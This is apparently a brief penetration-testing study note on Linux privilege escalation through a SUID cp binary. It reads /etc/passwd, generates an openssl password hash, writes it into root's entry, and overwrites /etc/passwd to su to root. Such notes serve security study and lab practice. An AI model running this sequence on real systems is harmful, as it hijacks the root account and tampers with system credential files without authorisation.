cat /etc/passwd

openssl passwd dog
MbmNyoQmTL7Tg

add that one in there over root instead of the x. like so:


have a copy of original /etc/passwd in your directory.

then do
cp passwd /etc/passwd
(overwrites it due to SUID binaries on cp)
su root
dog

![unnamed_9ec2759a63794746a3a01a4acc2bbfea](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/SUID%20binaries/cp/{{notename}}-202605011742.png)
![unnamed_6aa7390ec2da4c0d99ccfb8012c9781c](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/SUID%20binaries/cp/{{notename}}-202605011742-1.png)